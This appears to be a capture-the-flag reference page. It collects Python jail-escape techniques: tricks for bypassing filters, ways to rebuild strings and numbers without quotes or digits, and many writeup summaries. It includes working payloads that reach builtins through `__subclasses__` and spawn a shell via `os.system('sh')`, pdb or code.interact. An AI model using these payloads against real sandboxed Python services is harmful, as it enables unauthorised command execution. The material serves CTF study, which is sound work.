# Python Jail Escape Techniques

This document provides a comprehensive collection of Python jail escape techniques from various CTF challenges. Python jails restrict execution by filtering characters, banning builtins, or limiting available operations.

**References:**

- [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)
- [Pyjail collection](https://github.com/jailctf/pyjail-collection)
- [A collection of pyjails](https://github.com/salvatore-abello/pyjail/tree/main)

**Table of contents:**

* TOC
{:toc}

## Quick Reference Cheatsheet

### Unicode Character Bypass

Use Unicode characters that look like ASCII but bypass filters. See [details](./pyjail/unicode-bypass.md).

### Variable Assignment Without `=`

- **In `exec` contexts:** `a=1` (normal assignment)
- **In `eval` contexts:** `[a:=1]` (walrus operator)
- **List comprehension:** `[a for a in [1]]`
- **Compact form with spaces:** `[[a]for[a]in[[1]]]`

### Function Calls Without Parentheses
- **`__import__('os')` alternatives:**
  - `help.__class__.__getitem__ = __import__;help['os']`
  - `help.__class__.__contains__ = __import__('os').system;'sh' in help`
  - `ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]`
  - `help.__class__.__getattr__ = __import__; help.os`
- **`breakpoint()`:** `license._Printer__setup = breakpoint; str(license)`
- **`exec(input())`:** `@exec\n@input\nclass a: pass`

### String Construction Without Quotes

- **Character extraction:** `help.__doc__[index]` (extract from existing strings)

### Accessing Builtins When Banned

- `().__class__.__base__.__subclasses__()`
- `().__class__.__mro__[1].__subclasses__()`
- `().__reduce_ex__(2)[0].__builtins__`
- `().__reduce_ex__(2)[0].__globals__`
- `().__setattr__.__objclass__.__subclasses__()`

When you have access to exception:

```python
try:
    1/0
except Exception as e:
    print(e.__traceback__.tb_frame.f_builtins)
    print(e.__traceback__.tb_frame.f_globals["__builtins__"])
```

### Numbers and Booleans Without Digits

- **`True`:** Available directly
- **`True` alternative:** `[[]]>[]`
- **`True` alternative:** `not[]is[]`
- **`False`:** `[]>[]`
- **`False` alternative:** `[]is[]`
- **Increment:** `-~x` equals `x + 1`

### Obtaining Shell Access

- `_aix_support._read_cmd_output(cmd)`
- `_osx_support._read_output(cmd)`
- `breakpoint()`
- `code.InteractiveConsole().interact()`
- `code.interact()`
- `doctest.debug_script(src)`
- `pdb.set_trace()`
- `pdb.run(src)`
- `pydoc.pipe_pager(text, cmd)`
- `pydoc.tempfile_pager(text, cmd)`

## SECCON CTF 2025 Quals

Requirements:

1. At most one occurrence for each character `.,(+)`: use lambda + `__getattribute__` for `a.b`, call function step by step, save intermediate values in exception `KeyError` via `{}[obj]`
2. No builtins: use `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`

Details [here](../2025-12-13-seccon-ctf-2025-quals/excepython.md).

## Hack.lu CTF 2025 FÄNGELSE

Requirements:

1. No more than 5 characters: use `exit(flagbuf)` to leak flag, use `a=exit;len=a` to override function in two steps, use `ⅺ` for `xi` to break the length limitation; alternatively, set `len=all` to bypass length check

Details [here](./pyjail/hacklu-ctf-2025-fangelse.md).

## jailCTF 2025 impossible

Requirements:

1. No parens: use `obj.__class__.__getitem__ = func` and `obj[arg]` to call function
2. No spaces or equal signs: use `[[]for[a]in[[b]]]` instead of `a = b`
3. No strings: set `obj.__class__.__getattr__ = __import__` and `obj.os` to import `os`

Details [here](./pyjail/jailctf-2025-impossible.md).

## jailCTF 2025 one

Requirements:

1. Only one `.`: use lambda function to reuse `value.__getattribute__` call
2. No builtins: use `().__setattr__.__objclass__.__subclasses__()[os_index].__init__.__globals__['system']('sh')` to get shell

Details [here](./pyjail/jailctf-2025-one.md).

## jailCTF 2025 primal

Requirements:

1. No `eta`: no getattr/setattr, use `obj[name]` to access fields
2. No builtins: use `().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os')` to get os
3. Words should have prime length: use `'aa'.__len__()` for `2`, use `\xXX` in strings

Details [here](./pyjail/jailctf-2025-primal.md).

## CrewCTF 2025 pyfuck

Requirement:

1. Only alphabetic characters, parentheses and plus sign: use plus sign to construct string, generator syntax and function call
2. Limited builtins and count of `+`: search for a short combination to create the intended string

Details [here](./pyjail/crewctf-2025-pyfuck.md).

## CrewCTF 2025 Bytecode Bonanza - Basics

Requirements:

1. Limit to the following opcodes in Python 3.9:
    1. POP_TOP: pop top element
    2. DUP_TOP: duplicate top element
    3. UNARY_INVERT: invert top element
    4. BINARY_ADD: pop two elements, push the sum of them
    5. POP_JUMP_IF_TRUE: pop top element, jump to target if element is true (non-zero)
    6. EXTENDED_ARG: construct 16 bit argument for the next op
2. Implement three functions: `a-b`, `1337` and `a*b`

Details [here](./pyjail/crewctf-2025-bytecode-bonanza-basics.md).

## WHY2025 CTF TitleCase

Use unicode bypass to avoid `str.title()`.

Details [here](../2025-08-08-why2025/misc/title-case.md).

## FortID CTF 2025 Michael Scottfield

Requirements:

1. Length <= 500: Easy to achieve
2. Allow `()` but no parameters: Use `pdb.set_trace()` or `code.InteractiveConsole().interact()`
3. No strings: Use docstrings and `str[index]` to create strings
3. No numbers: Use `True` as 1
4. No builtins: Use `().__class__.__base__.__subclasses__()`

Details [here](../2025-09-12-fortid-ctf-2025/michael-scottfield.md).

## LACTF 2025 farquaad

Requirements:

1. Only printable characters
2. No `e` or `E`: Use `list(x.__dict__)[index]` to find strings with `e` in it and call it via `x.__dict__[list(x.__dict__)[index]](args)`
3. No builtins: Use `().__class__.__mro__[1].__subclasses__()`

Details [here](./pyjail/lactf-2025-farquaad.md).

## scriptCTF 2025 Modulo

Requirements:

1. No builtins: use `().__class__.__base__.__subclasses__()[os_wrap_index].__init__.__globals__["system"]("sh")`
2. No lowercase letters except `c`, only allow `%` binary op: use `"%c%c" % (97, 98)` to construct strings
3. No integers: use `()<((),)` as `1`, use `-~x` as `x+1`
4. No `.`: use `getattr(A, "B")` as `A.B`

Details [here](../2025-08-16-scriptctf2025/modulo.md).

## UIUCTF 2024 Astea

Requirements:

1. No function call: Use `f"{license}" for license._Printer__setup in [function_to_call]]` to call `function_to_call`
2. No builtins: Use `.__builtins__` of the given function to access builtins dict, or `.__globals__["__builtins__"]` of the given function to access builtins module
3. No assignment: Use `[a:=b]` for assignment

Details [here](./pyjail/uiuctf-2024-astea.md).

## jailCTF 2024 filterd

Requirement:

1. Input length <= 14: raise input length limit on the fly
2. Blacklisted builtins: reuse existing function to re-evaluate

Details [here](./pyjail/jailctf-2024-filterd.md).

## jailCTF 2024 no-nonsense

Requirements:

1. No `([=])`: call functions using decorators, `@exec\n@input\nclass a: pass`
2. AST name does not appear in input: use unicode bypass
3. No newlines: use `\r` instead of `\n` for multiline code

Details [here](./pyjail/jailctf-2024-no-nonsense.md).

## UofTCTF 2024 Jail Zero

Requirements:

1. No alphabetic: Use [Unicode Block “Mathematical Alphanumeric Symbols”](https://www.compart.com/en/unicode/block/U+1D400) to bypass
2. No numbers: Use `(''=='')` as 1
3. No double underscores: Use [FULLWIDTH LOW LINE](https://unicode-explorer.com/c/FF3F)
4. No builtins: Use `().__class__.__base__.__subclasses__()`

Details [here](./pyjail/uoftctf-2024-jail-zero.md).

## SECCON CTF 2024 Quals 1linepyjail

Requirements:

1. Length <= 100: Try hard to reduce input length
2. Allow `()` but no parameters: Use `sys.modules["pdb"].set_trace()`
3. No builtins: Use `().__class__.__base__.__subclasses__()` to find `sys`

Details [here](./pyjail/seccon-2024-quals-1linepyjail.md).

## ImaginaryCTF 2024 ok-nice

Requirements:

1. No numbers: Use `True` as 1
2. Exception side channel: Use integer division by zero or array out of bounds to guess each character
3. `len(set(input)) <= 17`: Reuse characters already appeared

Details [here](./pyjail/imaginaryctf-2024-ok-nice.md).

## ImaginaryCTF 2024 calc

Requirements:

1. Input is a expression: Use list comprehension to execute multiple statements
2. Input should match regex: Use `1,` to bypass since it is not a full match
3. Audit hook: Add signal handler, raise signal and change content of the audit hook to bypass

Details [here](./pyjail/imaginaryctf-2024-calc.md).

## NTUA_H4CK 2024 Snekbox

Requirements:

1. No non-ascii characters
2. Blacklisted dangerous functions: Use `globals()[function_name]` to bypass

Details [here](./pyjail/ntua-h4ck-2024-snekbox.md).


## TBTL CTF 2024 Squeezing Tightly On Arm

Requirements:

1. No `'`: Use `"` for strings
2. Some characters may appear only once: save intermediate values to locals
3. No builtins: Use `().__class__.__base__.__subclasses__()` to bypass

Details [here](./pyjail/tbtl-ctf-2024-squeezing-tightly-on-arm.md).

## TCP1P CTF 2024 typically not a revenge

Requirements:

1. No numbers: Use `arr[[]is[]]` for `arr[0]`, `arr[not[]is[]]` for `arr[1]`, `arr[not[]is[]:][not[]is[]]` for `arr[2]`
2. No parens: Use `[class[arg] for class.__class_getitem__ in [function_to_call]]` to call function
3. No assignments or commas: Use `[... for a in [b] for c in [d]]`
4. No spaces: Use `\f` i.e. form feed
5. No builtins: Use `[].__class__.__base__.__subclasses__()`
6. No sys module: Use `<class 'os._wrap_close'>` to find system

Details [here](./pyjail/tcp1p-ctf-2024-typically-not-a-revenge.md).

## TCP1P CTF 2024 functional

Requirements:

1. Call functions with zero argument, or return value of another function, and all function names should match `[ad-z]+`

Details [here](./pyjail/tcp1p-ctf-2024-functional.md).

## TCP1P CTF 2023 PyMagic

Requirements:

1. No `()`: Use `class.__class_getitem__` and `class[]` to bypass
2. No strings: Use docstrings and `str[index]` to create strings
3. No numbers: Use `True` as 1
4. No spaces: Use `\r` to bypass while making `input()` happy
5. No builtins: Use `().__class__.__base__.__subclasses__()`

Details [here](./pyjail/tcp1p-ctf-2023-pymagic.md).

## GDG Algiers 2022 Type_it

Requirements:

1. No non-ascii characters
2. No blacklisted characters
3. Prone to string injection

Details [here](./pyjail/gdg-algiers-2022-type-it.md).

## ImaginaryCTF Round 23 June 2022 Stackless Jail

Requirements:

1. Function can only use at most one stack element: use `CALL_FUNCTION` instead of `CALL_METHOD`, i.e. use `B = A.method; C = B()` instead of `A.method()`

Details [here](./pyjail/imaginaryctf-round-23-stackless-jail.md).
